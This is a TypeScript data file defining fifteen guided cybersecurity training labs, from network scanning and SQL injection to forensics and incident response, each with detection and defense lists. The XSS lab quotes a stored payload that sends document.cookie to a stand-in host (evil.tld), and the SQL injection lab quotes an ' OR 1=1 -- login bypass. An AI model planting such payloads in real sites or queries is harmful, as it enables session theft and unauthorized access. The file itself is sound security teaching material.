/** Cybersecurity Labs — guided, node-based security training.
 *  Content is self-contained (no external data), and completion flows through
 *  the existing learning system: lab_progress + add_user_points XP. */

export type LabDifficulty = 'Beginner' | 'Intermediate' | 'Advanced';

export interface SecurityLab {
  id: string;
  title: string;
  category: string;
  difficulty: LabDifficulty;
  icon: string; // lucide icon name key in the page
  points: number;
  attackExplanation: string;
  objectives: string[];
  vulnerabilities: string[];
  detection: string[];
  defenses: string[];
  tools: string[];
  challenges: string[];
}

export const SECURITY_LABS: SecurityLab[] = [
  {
    id: 'lab-network-scanning',
    title: 'Network Scanning',
    category: 'Reconnaissance',
    difficulty: 'Beginner',
    icon: 'network',
    points: 15,
    attackExplanation:
      'Attackers map live hosts and open services on a network before exploiting anything. A scan sweep (like a ping sweep plus service discovery) reveals which devices exist, what operating systems they run and which doors are open.',
    objectives: [
      'Understand the phases of network reconnaissance',
      'Read and interpret scan output (host, port, service, state)',
      'Recognise what a scanning attack looks like from the defender side',
    ],
    vulnerabilities: [
      'Exposed management ports (22/SSH, 3389/RDP, 5900/VNC)',
      'Flat networks where one compromised host can reach everything',
      'Devices that respond to every probe and leak OS fingerprints',
    ],
    detection: [
      'Spikes in SYN or ICMP packets to many addresses from one source',
      'Nmap/ping-sweep patterns in firewall or IDS logs',
      'Unexpected traffic to unused IP ranges',
    ],
    defenses: [
      'Segment networks and restrict east-west traffic',
      'Firewall rules that default-deny unused ports',
      'Rate-limit and alert on repeated probing',
    ],
    tools: ['Nmap', 'Wireshark', 'netcat', 'Snort/Suricata'],
    challenges: [
      'Identify which ports a scan revealed on a sample host report',
      'Match three scan signatures to their intent (sweep, version scan, OS scan)',
      'Write one firewall rule that would have blocked the sweep',
    ],
  },
  {
    id: 'lab-port-scanning',
    title: 'Port Scanning',
    category: 'Reconnaissance',
    difficulty: 'Beginner',
    icon: 'scan',
    points: 15,
    attackExplanation:
      'A port scan probes TCP/UDP ports on a host to list running services. SYN ("half-open") scans try to stay stealthy: they send SYN packets and watch for SYN-ACKs without ever completing the handshake.',
    objectives: [
      'Distinguish connect, SYN and UDP scan behaviour',
      'Interpret open / filtered / closed port states',
      'Correlate scan activity with firewall logs',
    ],
    vulnerabilities: [
      'Forgotten test services listening on odd ports',
      'Legacy protocols (Telnet, FTP) still enabled',
      'Services bound to 0.0.0.0 instead of localhost',
    ],
    detection: [
      'One source IP hitting hundreds of distinct ports',
      'Many SYN packets with no completing handshake (half-open scan)',
      'IDS rules matching nmap-style probes',
    ],
    defenses: [
      'Close unused ports at the host firewall',
      'Hide services behind VPN or zero-trust access',
      'Monitor with honeypot ports that should never be touched',
    ],
    tools: ['Nmap', 'masscan', 'ss/netstat', 'Zeek'],
    challenges: [
      'Classify six scanned ports as safe or risky for a web server',
      'Spot the half-open scan in a packet sample',
      'Choose which of three services should be moved behind a VPN',
    ],
  },
  {
    id: 'lab-sql-injection',
    title: 'SQL Injection',
    category: 'Web Security',
    difficulty: 'Intermediate',
    icon: 'database',
    points: 20,
    attackExplanation:
      'SQL injection happens when user input is concatenated into a database query. An input like \'" OR 1=1 --\' can turn a login check into an always-true condition, dump tables or modify data.',
    objectives: [
      'Explain how unparameterised input reaches SQL',
      'Recognise union-based and boolean-based injection payloads',
      'Defend with parameterised queries and least privilege',
    ],
    vulnerabilities: [
      'String-built queries with unsanitised input',
      'Detailed database errors shown to users',
      'Application accounts with admin DB privileges',
    ],
    detection: [
      'SQL keywords and quotes in request logs (\' OR, UNION SELECT, --)',
      'Unusual number of 500 errors from one endpoint',
      'WAF rules flagging tautology payloads (1=1)',
    ],
    defenses: [
      'Parameterised queries / prepared statements everywhere',
      'Input validation with allow-lists and least-privilege DB accounts',
      'WAF rules plus generic error pages',
    ],
    tools: ['sqlmap', 'OWASP ZAP', 'Burp Suite', 'PostgreSQL logs'],
    challenges: [
      'Fix a vulnerable login query by parameterising it',
      'Explain why "\'" in a search box triggers an error in the vulnerable example',
      'Pick the DB account privilege that limits damage from a successful injection',
    ],
  },
  {
    id: 'lab-xss',
    title: 'Cross-Site Scripting (XSS)',
    category: 'Web Security',
    difficulty: 'Intermediate',
    icon: 'code',
    points: 20,
    attackExplanation:
      'XSS injects attacker JavaScript into pages other users view. A stored payload like <script>fetch("https://evil.tld?c="+document.cookie)</script> in a comment field can steal sessions for everyone who loads the page.',
    objectives: [
      'Tell reflected, stored and DOM-based XSS apart',
      'Trace how untrusted input reaches the DOM without encoding',
      'Apply output encoding and a Content Security Policy',
    ],
    vulnerabilities: [
      'innerHTML used with user input',
      'Missing output encoding in templates',
      'No CSP or unsafe-inline script policy',
    ],
    detection: [
      'Script tags and event handlers (onerror, onload) in form submissions',
      'Alert on outbound requests with query strings containing document.cookie',
      'DOM taint analysers in security tooling',
    ],
    defenses: [
      'Context-aware output encoding (HTML, attribute, JS, URL)',
      'Strict Content-Security-Policy blocking inline scripts',
      'HttpOnly + Secure session cookies',
    ],
    tools: ['Burp Suite', 'OWASP ZAP', 'DOM Invader', 'CSP Evaluator'],
    challenges: [
      'Identify the sink and source in a DOM XSS sample',
      'Rewrite one unsafe innerHTML assignment safely',
      'Draft a CSP header that blocks the sample payload',
    ],
  },
  {
    id: 'lab-phishing',
    title: 'Phishing',
    category: 'Social Engineering',
    difficulty: 'Beginner',
    icon: 'mail',
    points: 10,
    attackExplanation:
      'Phishing emails impersonate trusted brands or colleagues to trick users into revealing credentials or opening malicious attachments. Modern campaigns use look-alike domains, urgent language and OAuth consent abuse.',
    objectives: [
      'Deconstruct the anatomy of a phishing email',
      'Spot look-alike domains and homograph tricks',
      'Report and respond to suspected phishing correctly',
    ],
    vulnerabilities: [
      'Users trained to click links before checking them',
      'Email-only MFA that a phished one-time code defeats',
      'No DMARC/SPF/DKIM enforcement',
    ],
    detection: [
      'SPF/DKIM/DMARC failures on inbound mail',
      'Mismatches between display name and true sender domain',
      'Newly registered sender domains',
    ],
    defenses: [
      'Enforce DMARC and mark failures in quarantine',
      'Phishing-resistant MFA (passkeys, hardware keys)',
      'Regular phishing simulations and one-click reporting',
    ],
    tools: ['PhishTool', 'VirusTotal', 'MXToolbox headers', 'Gmail/Outlook header viewers'],
    challenges: [
      'Find three red flags in a sample phishing email',
      'Decode an obfuscated sender domain',
      'Decide the correct response for a user who already clicked',
    ],
  },
  {
    id: 'lab-malware-analysis',
    title: 'Malware Analysis',
    category: 'Malware',
    difficulty: 'Advanced',
    icon: 'bug',
    points: 30,
    attackExplanation:
      'Malware analysis dissects a suspicious binary to learn what it does: persistence mechanisms, command-and-control addresses, encryption behaviour. Static analysis inspects code without running it; dynamic analysis detonates it in an isolated sandbox.',
    objectives: [
      'Run a safe static triage (hashes, strings, imports)',
      'Describe safe dynamic analysis in an isolated environment',
      'Turn findings into detection indicators',
    ],
    vulnerabilities: [
      'Users running unknown executables from downloads or email',
      'No application allow-listing on servers',
      'Analysts working without isolation (real risk!)',
    ],
    detection: [
      'Hash matches on threat intelligence feeds (like the War Room imports)',
      'Suspicious behaviours: registry run keys, scheduled tasks, odd parent-child process chains',
      'Beacons to known C2 domains',
    ],
    defenses: [
      'EDR with behavioural rules, not just signatures',
      'Application allow-listing and least-privilege execution',
      'Isolated VMs / sandboxes for all samples',
    ],
    tools: ['PEStudio', 'strings', 'YARA', 'Cuckoo/CAPE sandbox', 'VirusTotal'],
    challenges: [
      'Triage a sample: list three suspicious strings or imports',
      'Write one YARA rule from the sample’s indicators',
      'Map the sample’s behaviour to an ATT&CK technique',
    ],
  },
  {
    id: 'lab-password-security',
    title: 'Password Security',
    category: 'Identity',
    difficulty: 'Beginner',
    icon: 'key',
    points: 10,
    attackExplanation:
      'Weak and reused passwords remain the easiest way in. Credential-stuffing replays leaked username/password pairs against login forms, while offline cracking attacks unsalted or fast hashes recovered from a breach.',
    objectives: [
      'Compare password storage schemes (plain, unsalted, bcrypt/argon2)',
      'Understand credential stuffing and why reuse is deadly',
      'Design a modern password policy',
    ],
    vulnerabilities: [
      'MD5/SHA1 password hashes without salt',
      'No breached-password screening',
      'Password rotation rules that push predictable patterns',
    ],
    detection: [
      'Bursts of failed logins across many accounts from one IP',
      'Login attempts with credentials from public breach corpuses',
      'Impossible-travel sign-in patterns',
    ],
    defenses: [
      'Argon2id or bcrypt with proper cost factors',
      'Breached-password checks and rate limiting',
      'Passkeys / MFA as the primary defence',
    ],
    tools: ['hashcat', 'Have I Been Pwned API', 'KeePassXC', 'zxcvbn'],
    challenges: [
      'Estimate crack time for four sample password hashes',
      'Rewrite a bad corporate password policy using NIST 800-63B advice',
      'Explain why salt defeats rainbow tables',
    ],
  },
  {
    id: 'lab-brute-force',
    title: 'Brute Force Attacks',
    category: 'Identity',
    difficulty: 'Beginner',
    icon: 'hammer',
    points: 10,
    attackExplanation:
      'Brute force attacks guess credentials by trying many combinations — pure brute force enumerates keyspace, while password spraying tries one common password across thousands of accounts to stay under lockout thresholds.',
    objectives: [
      'Compare brute force, dictionary and spraying attacks',
      'Calculate how lockout and rate-limit settings change attack cost',
      'Configure defences that stop spraying',
    ],
    vulnerabilities: [
      'No rate limiting on login endpoints',
      'Lockout only on the account, not the source',
      'Predictable usernames exposed publicly',
    ],
    detection: [
      'Many failures across distinct accounts from one source (spraying)',
      'Long-duration single-account hammering (brute force)',
      'Auth failures in logs with rotating IPs (distributed)',
    ],
    defenses: [
      'Rate limiting + progressive delays + CAPTCHA',
      'Smart lockouts and MFA everywhere',
      'Alert on spraying patterns, not just single-account failures',
    ],
    tools: ['hydra', 'fail2ban', 'auth log analysis', 'crowdsec'],
    challenges: [
      'Distinguish the three attack types from log excerpts',
      'Pick rate-limit values that stop spraying without hurting users',
      'Write an alert rule for the spraying pattern',
    ],
  },
  {
    id: 'lab-dns-security',
    title: 'DNS Security',
    category: 'Networking',
    difficulty: 'Intermediate',
    icon: 'globe',
    points: 20,
    attackExplanation:
      'DNS can be both the target and the weapon: spoofing/poisoning redirects users to attacker sites, while tunnelling hides stolen data inside TXT or subdomain queries that look like normal lookups.',
    objectives: [
      'Explain cache poisoning and the role of DNSSEC',
      'Recognise DNS tunnelling patterns in query logs',
      'Harden a resolver configuration',
    ],
    vulnerabilities: [
      'Open resolvers accepting external queries',
      'No DNSSEC validation',
      'Unmonitored egress DNS allowing any domain',
    ],
    detection: [
      'Long, random subdomains and abnormal TXT query volume (tunnelling)',
      'Queries to known-malicious domains',
      'NXDOMAIN floods',
    ],
    defenses: [
      'DNSSEC on authoritative zones, validation on resolvers',
      'Egress DNS filtering with allow/block lists',
      'Log and analyse all DNS queries',
    ],
    tools: ['dig', 'Wireshark DNS filters', 'Pi-hole', 'Zeek dns.log'],
    challenges: [
      'Spot the tunnelling traffic in a query sample',
      'Choose which record type an attacker would abuse for tunnelling',
      'Write one resolver hardening checklist item',
    ],
  },
  {
    id: 'lab-man-in-the-middle',
    title: 'Man-in-the-Middle',
    category: 'Networking',
    difficulty: 'Intermediate',
    icon: 'shuffle',
    points: 20,
    attackExplanation:
      'A MITM attack intercepts traffic between two parties — ARP spoofing on LANs, evil-twin Wi-Fi, or TLS stripping — letting the attacker read or modify data in transit.',
    objectives: [
      'Understand ARP spoofing and rogue access points',
      'Explain why HTTPS and HSTS break interception',
      'Detect and prevent MITM on a network',
    ],
    vulnerabilities: [
      'Plain HTTP services on trusted networks',
      'Users clicking through certificate warnings',
      'No dynamic ARP inspection / port security on switches',
    ],
    detection: [
      'Duplicate IPs / MAC flap alerts and gratuitous ARP storms',
      'Certificate warnings from a different issuer than expected',
      'Rogue AP detection in wireless controllers',
    ],
    defenses: [
      'HTTPS everywhere + HSTS + certificate pinning where possible',
      'Dynamic ARP inspection, DHCP snooping, 802.1X',
      'WPA3-Enterprise and rogue AP detection',
    ],
    tools: ['Wireshark', 'arpwatch', 'ettercap (in labs)', 'SSL Labs'],
    challenges: [
      'Identify MITM indicators in a packet capture',
      'Order the four switch features that stop ARP spoofing',
      'Explain what HSTS prevents that HTTPS alone does not',
    ],
  },
  {
    id: 'lab-privilege-escalation',
    title: 'Privilege Escalation',
    category: 'Systems',
    difficulty: 'Advanced',
    icon: 'shield-off',
    points: 30,
    attackExplanation:
      'After landing on a low-privilege account, attackers escalate: exploiting SUID misconfigurations, kernel bugs, writable service paths or sudo rules to gain root. On Windows it might be unquoted service paths or token abuse.',
    objectives: [
      'Enumerate common Linux and Windows escalation vectors',
      'Practise least-privilege review of sudo rules and services',
      'Detect escalation attempts from audit logs',
    ],
    vulnerabilities: [
      'SUID binaries with shell escapes',
      'Overly broad sudo rules (NOPASSWD: ALL)',
      'Writable service binaries or PATH directories',
    ],
    detection: [
      'Auditd rules on /etc/passwd, sudo and SUID execution',
      'Unexpected new SUID binaries appearing',
      'User flag/permissions changes in audit logs',
    ],
    defenses: [
      'Patch and harden: remove unneeded SUID bits and capabilities',
      'Least-privilege sudo with command allow-lists',
      'File integrity monitoring (AIDE/Wazuh)',
    ],
    tools: ['linPEAS/winPEAS', 'auditd', 'sudo -l', 'Wazuh'],
    challenges: [
      'Find the escalation vector in a sample sudo -l output',
      'Pick the safest sudo rule from four candidates',
      'Write an auditd rule to catch passwd-file modification',
    ],
  },
  {
    id: 'lab-web-security',
    title: 'Web Security Essentials',
    category: 'Web Security',
    difficulty: 'Intermediate',
    icon: 'layout',
    points: 20,
    attackExplanation:
      'Beyond injection and XSS lie the OWASP Top 10 basics: broken access control, insecure direct object references, missing rate limits, security-header gaps and unsafe deserialisation.',
    objectives: [
      'Walk the OWASP Top 10 and map each to a concrete check',
      'Identify IDOR and broken access control in an API example',
      'Harden HTTP response headers',
    ],
    vulnerabilities: [
      'Object IDs accepted without ownership checks (IDOR)',
      'Missing Content-Security-Policy, X-Frame-Options, HSTS',
      'Insecure deserialisation of user-supplied data',
    ],
    detection: [
      '403/404 probing bursts followed by 200s',
      'Requests cycling numeric object IDs',
      'Header scanners reporting missing protections',
    ],
    defenses: [
      'Server-side authorisation checks on every object access',
      'Secure headers (CSP, HSTS, X-Frame-Options, Referrer-Policy)',
      'Rate limits and secure deserialisation practices',
    ],
    tools: ['Burp Suite', 'OWASP ZAP', 'securityheaders.com', 'curl'],
    challenges: [
      'Find the IDOR in a sample API response set',
      'Assemble a hardened header set for a web app',
      'Match four OWASP Top 10 items to their fixes',
    ],
  },
  {
    id: 'lab-cryptography',
    title: 'Cryptography',
    category: 'Cryptography',
    difficulty: 'Intermediate',
    icon: 'lock',
    points: 20,
    attackExplanation:
      'Cryptography fails in practice through misuse: ECB mode leaking patterns, hardcoded keys, IV reuse in stream ciphers, or trusting hashing alone for confidentiality.',
    objectives: [
      'Distinguish symmetric vs asymmetric use cases',
      'Recognise ECB patterns and IV-reuse failures',
      'Choose modern primitives and modes (AES-GCM, ChaCha20-Poly1305)',
    ],
    vulnerabilities: [
      'ECB mode for structured data',
      'Nonce/IV reuse in CTR/GCM modes',
      'Keys hardcoded in source or config',
    ],
    detection: [
      'Identical ciphertext blocks revealing ECB use',
      'Repeated keystream overlap in CTR traffic',
      'Secrets scanners finding keys in code',
    ],
    defenses: [
      'AEAD modes with unique nonces from a CSPRNG',
      'Keys in a KMS/vault, rotated regularly',
      'Hashing for integrity (HMAC), never for confidentiality',
    ],
    tools: ['openssl', 'CyberChef', 'hashcat', 'KMS/secret managers'],
    challenges: [
      'Decide the correct primitive for four scenarios',
      'Spot the ECB image and explain why the pattern leaks',
      'Explain what breaks when a GCM nonce repeats',
    ],
  },
  {
    id: 'lab-digital-forensics',
    title: 'Digital Forensics',
    category: 'Investigation',
    difficulty: 'Advanced',
    icon: 'search',
    points: 30,
    attackExplanation:
      'Digital forensics reconstructs incidents from evidence: disk images, memory dumps, event logs and file timelines — while keeping a chain of custody so findings hold up.',
    objectives: [
      'Plan evidence acquisition and preservation order (memory first)',
      'Build a timeline from file system and log artefacts',
      'Report findings with reproducible analysis',
    ],
    vulnerabilities: [
      'Evidence altered by live-response actions (booting, AV scans)',
      'Missing or unverified hashes for images',
      'Log gaps from short retention windows',
    ],
    detection: [
      'Timeline anomalies: timestomping, files written before user logon',
      'Prefetch/shimcache artefacts of executed malware',
      'Persistence entries (run keys, scheduled tasks, services)',
    ],
    defenses: [
      'Centralised, immutable logging with sufficient retention',
      'EDR telemetry and regular acquisition drills',
      'Documented IR playbooks with chain-of-custody forms',
    ],
    tools: ['Autopsy', 'Volatility', 'plaso/log2timeline', 'sha256sum', 'CyberChef'],
    challenges: [
      'Order the acquisition steps for a compromised laptop',
      'Find the earliest malicious artefact in a sample timeline',
      'Identify the persistence mechanism from artefact clues',
    ],
  },
  {
    id: 'lab-incident-response',
    title: 'Incident Response',
    category: 'Investigation',
    difficulty: 'Intermediate',
    icon: 'siren',
    points: 25,
    attackExplanation:
      'Incident response turns chaos into process: prepare, detect, contain, eradicate, recover and learn. The War Room incidents you create here follow the same lifecycle — triage, assign, contain, mitigate, resolve.',
    objectives: [
      'Map a real alert to the IR lifecycle stages',
      'Practise triage and severity assignment',
      'Run containment decisions under time pressure',
    ],
    vulnerabilities: [
      'No documented roles — everyone improvises',
      'Containment that destroys evidence',
      'No post-incident review, so attacks repeat',
    ],
    detection: [
      'Correlation rules that surface multi-stage intrusions',
      'Ticket metrics: time to detect vs time to contain',
      'War Room incidents created from imported indicators',
    ],
    defenses: [
      'A tested IR plan with on-call rotation',
      'Isolation playbooks that preserve evidence',
      'Blameless post-incident reviews feeding hardening',
    ],
    tools: ['The War Room incident tracker', 'SIEM queries', 'IR playbooks', 'NIST 800-61'],
    challenges: [
      'Assign the correct lifecycle stage to six sample actions',
      'Choose containment that preserves evidence',
      'Write one improvement action from a mock post-incident review',
    ],
  },
];

export const getLabById = (id: string) => SECURITY_LABS.find((l) => l.id === id);
